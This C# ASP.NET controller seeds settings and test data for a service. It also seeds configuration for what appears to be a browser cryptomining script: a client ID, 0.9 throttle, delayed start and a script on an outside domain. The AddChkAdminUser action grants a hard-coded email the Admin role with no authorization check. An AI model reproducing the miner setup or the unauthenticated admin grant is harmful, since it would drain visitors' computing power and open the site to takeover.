using Microsoft.AspNet.Identity;
using Microsoft.AspNet.Identity.EntityFramework;
using SignalRService.Localization;
using SignalRService.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Hosting;
using System.Web.Http.Cors;
using System.Web.Mvc;
using System.Xml.Serialization;

namespace SignalRService.Controllers
{

    public class HomeController : BaseController
    {
        private readonly HostingEnvironment _app;
        private DAL.ServiceContext db = new DAL.ServiceContext();

        public ActionResult Index()
        {
            return View();
        }

        public ActionResult About()
        {
            ViewBag.Message = "Your application description page.";

            return View();
        }

        public ActionResult Contact()
        {
            ViewBag.Message = BaseResource.Get("ContactPageTitle");

            return View();
        }

        public ActionResult Seeding()
        {
            return View();
        }

        public ActionResult SeedTestData()
        {
            _seed_testdata();
            return Json(new { Success = true, Message = "seeding testdata complete" }, JsonRequestBehavior.AllowGet);
        }

        public ActionResult SeedGeneralSettings()
        {
            IList<GeneralSettingsModel> defaultStandards = new List<GeneralSettingsModel>();
            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductNameMinLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductNameMinLength, Type = Enums.EnumSettingType.Int, Value = "3" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductNameMaxLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductNameMaxLength, Type = Enums.EnumSettingType.Int, Value = "90" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductMinPrice))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductMinPrice, Type = Enums.EnumSettingType.Int, Value = "0" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductMaxPrice))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductMaxPrice, Type = Enums.EnumSettingType.Float, Value = "99999.99" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductPartNumberMinLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductPartNumberMinLength, Type = Enums.EnumSettingType.Int, Value = "3" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductNameMaxLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductPartNumberMaxLength, Type = Enums.EnumSettingType.Int, Value = "12" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductDescriptionMinLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductDescriptionMinLength, Type = Enums.EnumSettingType.Int, Value = "3" });

            if (!db.GeneralSettings.Any(ln => ln.GeneralSetting == Enums.EnumGeneralSetting.ProductDescriptionMaxLength))
                defaultStandards.Add(new GeneralSettingsModel() { GeneralSetting = Enums.EnumGeneralSetting.ProductDescriptionMaxLength, Type = Enums.EnumSettingType.Int, Value = "128" });

            if(!db.MinerConfiurationModels.Any())
            {
                db.MinerConfiurationModels.Add(new MinerConfigurationModel()
                {
                    ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
                    Throttle = 0.9f,
                    ScriptUrl = "https://www.freecontent.date./W7KS.js",
                    StartDelayMs = 5000,
                    ReportStatusIntervalMs = 60000
                });
            }

            db.GeneralSettings.AddRange(defaultStandards);
            db.SaveChanges();

            return Json(new { Success = true, Message = "seeding generalsettings done" }, JsonRequestBehavior.AllowGet);

        }

        public ActionResult SaveLocalization()
        {
            var tpath = Server.MapPath("~");
            tpath += "Localization/LocalizationSrc.xml";
            var respath = Localization.BaseResource.CreateLocalizationSrc(db,tpath);
            return Json(new { Success = true, Message = "localization save to: " + respath }, JsonRequestBehavior.AllowGet);
        }

        public ActionResult SeedLocalization()
        {
            try
            {
                List<Models.LocalizationModel> items = new List<Models.LocalizationModel>();
                var fpath = Server.MapPath("~");
                fpath += "Localization\\LocalizationSrc.xml";

                using (var stream = System.IO.File.OpenRead(fpath))
                {
                    var serializer = new XmlSerializer(typeof(List<Models.LocalizationModel>));
                    items = serializer.Deserialize(stream) as List<Models.LocalizationModel>;

                    int maxCounter = items.Count;
                    int counter = 0;
                    foreach (var item in items)
                    {
                        var indb = db.Localization.FirstOrDefault(ln => ln.Key == item.Key && ln.Culture == item.Culture);
                        if(indb == null)
                        {
                            db.Localization.Add(item);
                        } 
                        else
                        {
                            indb.Value = item.Value;
                        }
                    }
                    db.SaveChanges();
                }

                return Json(new { Success = true, Message = "language seeding complete" }, JsonRequestBehavior.AllowGet);
            }
            catch (Exception ex)
            {
                return Json(new { Success = true, Message = ex.Message }, JsonRequestBehavior.AllowGet);
                throw ex;
            }
        }

        public ActionResult AddChkAdminUser()
        {
            var appDbContext = new Models.ApplicationDbContext();
            var _userManager = new UserManager<Models.ApplicationUser>(new UserStore<Models.ApplicationUser>(appDbContext));
            var _roleManager = new RoleManager<IdentityRole>(new RoleStore<IdentityRole>(appDbContext));

            var user = _userManager.FindByEmail("chk.mailbox@gmail.com");

            if (!_roleManager.RoleExists("Admin"))
            {
                _roleManager.Create(new IdentityRole() { Name = "Admin" });

            }
            var admrole = _roleManager.FindByName("Admin");

            var a2res = _userManager.AddToRole(user.Id, admrole.Name);
            if (a2res.Succeeded)
            {
                return Json(new { Success = true, Message = "added user chk for admin-role" }, JsonRequestBehavior.AllowGet);
            }
            else
            {
                return Json(new { Success = true, Message = a2res.Errors.First().ToString() }, JsonRequestBehavior.AllowGet);
            }
           
        }

        public ActionResult CreateLuceneIndex()
        {
            try
            {
                Utils.LuceneUtils.AddUpdateLuceneIndex(db.ProductTmpImport.ToList());
                return Json(new { Success = true, Message = "LuceneIndex created" }, JsonRequestBehavior.AllowGet);
            }
            catch (Exception ex)
            {
                return Json(new { Success = false, Message = ex.Message }, JsonRequestBehavior.AllowGet);
            }
        }

        public ActionResult ClearLuceneIndex()
        {
            try
            {
                Utils.LuceneUtils.ClearLuceneIndex();
                return Json(new { Success = true, Message = "LuceneIndex cleared" }, JsonRequestBehavior.AllowGet);
            }
            catch (Exception ex)
            {
                return Json(new { Success = false, Message = ex.Message }, JsonRequestBehavior.AllowGet);
            }
        }

        public ActionResult OptimizeLuceneIndex()
        {
            try
            {
                Utils.LuceneUtils.Optimize();
                return Json(new { Success = true, Message = "LuceneIndex optimized" }, JsonRequestBehavior.AllowGet);
            }
            catch (Exception ex)
            {
                return Json(new { Success = false, Message = ex.Message }, JsonRequestBehavior.AllowGet);
            }
        }

        private void _seed_testdata()
        {
            var defAccountProp = new Models.UserDataModel() { IdentityName = "anonymous" };
            db.UserData.Add(defAccountProp);

            //var defaultUser = new Models.UserDataModel() { IdentityName = "Anonymous" };
            //db.UserData.Add(defaultUser);
            //db.SaveChanges();
            var mc = db.MinerConfiurationModels.FirstOrDefault();

            var defaultSetting = new Models.ServiceSettingModel()
            {
                Owner = defAccountProp,
                ServiceName = "TestService",
                ServiceUrl = "testurl",
                ServiceType = Enums.EnumServiceType.OrderService,
                MinerConfiguration = mc
                 
            };
            db.ServiceSettings.Add(defaultSetting);
            db.SaveChanges();
        }

       
    }
}